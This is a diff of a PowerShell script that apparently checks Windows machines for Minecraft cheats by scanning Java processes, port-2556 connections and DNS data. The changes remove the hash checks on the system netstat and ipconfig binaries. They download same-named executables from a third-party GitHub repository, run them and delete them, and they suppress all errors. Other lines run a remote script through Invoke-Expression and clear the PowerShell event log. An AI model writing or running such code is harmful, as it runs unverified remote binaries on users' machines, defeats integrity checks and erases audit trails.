@@ -1,5 +1,6 @@
 cls
 $startTime = Get-Date
+$ErrorActionPreference = "SilentlyContinue"
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -41,6 +42,9 @@ if ($obsProcess) { $obsProcess | Stop-Process -Force }
 
 $data = Get-Date -Format "dd.MM.yyyy HH:mm"
 
+$utilsPath = "C:\ss"
+if (-not (Test-Path $utilsPath)) { New-Item -ItemType Directory -Path $utilsPath -Force | Out-Null }
+Set-Location $utilsPath
 
 Start-Process powershell -ArgumentList "-Command", "Invoke-Expression (Invoke-RestMethod 'https://github.com/Ryodzaki/scripts/raw/refs/heads/main/services.ps1')"
 Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/doomsday finder.exe" -OutFile "6.exe"
@@ -65,29 +69,22 @@ Get-CimInstance Win32_Process | Where-Object {$_.Name -like '*java*'} | ForEach-
 Write-Host ""
 
 
+
 #Connection info
-$nethash = (Get-FileHash "C:\Windows\System32\NETSTAT.EXE" -Algorithm SHA1).Hash
-if ($nethash -eq "c038069021cea437ae40b421929e9d4d1a3440b3") {
-    Write-Host "Valid!" -ForegroundColor Green
-} else {
-    Write-Host "NON VALID!" -ForegroundColor Red
-}
-$connections = @(netstat -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] | Select-Object -First 1 })
+Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/NETSTAT.EXE" -OutFile "netstat.exe"
+$connections = @(netstat.exe -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] | Select-Object -First 1 })
 Write-Host "Connections: `n" ($connections -join "`n") -ForegroundColor Yellow
 Write-Host ""
+if (Test-Path "netstat.exe") { Remove-Item -Path "netstat.exe" -Force }
 #END
 
 
 #Get DNS Data
-$nethash = (Get-FileHash "C:\Windows\System32\ipconfig.exe" -Algorithm SHA1).Hash
-if ($nethash -eq "d9bbb4e4900ff03b0486fac32768170249dad82d") {
-    Write-Host "Valid!" -ForegroundColor Green
-} else {
-    Write-Host "NON VALID!" -ForegroundColor Red
-}
-$dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
+Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/ipconfig.EXE" -OutFile "ipconfig.exe"
+$dnsData = @(ipconfig.exe /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
 Write-Host "DNS Data: `n" ($dnsData -join "`n") -ForegroundColor Yellow
 Write-Host ""
+if (Test-Path "ipconfig.exe") { Remove-Item -Path "ipconfig.exe" -Force }
 #END
 
 
@@ -329,6 +326,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
